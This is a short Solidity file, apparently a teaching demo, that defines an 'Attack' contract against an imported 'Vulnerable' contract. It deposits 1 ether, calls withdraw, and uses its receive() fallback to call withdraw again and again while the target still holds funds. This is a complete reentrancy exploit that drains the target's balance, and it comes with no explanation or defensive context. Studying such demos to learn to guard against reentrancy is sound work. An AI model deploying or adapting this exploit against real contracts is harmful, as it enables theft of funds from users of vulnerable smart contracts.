//SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.0;

import "./Vulnerable.sol";
contract Attack
{
    Vulnerable public vulnerable;

    constructor(address _vulnerableAddress)
    {
        vulnerable=Vulnerable(_vulnerableAddress);
    }

    function attack()external payable{
        vulnerable.deposit{value:1 ether}();
        vulnerable.withdraw();
    }

    receive()external payable{
        if(address(vulnerable).balance>=1 ether)
        {
            vulnerable.withdraw();
        }

    }

}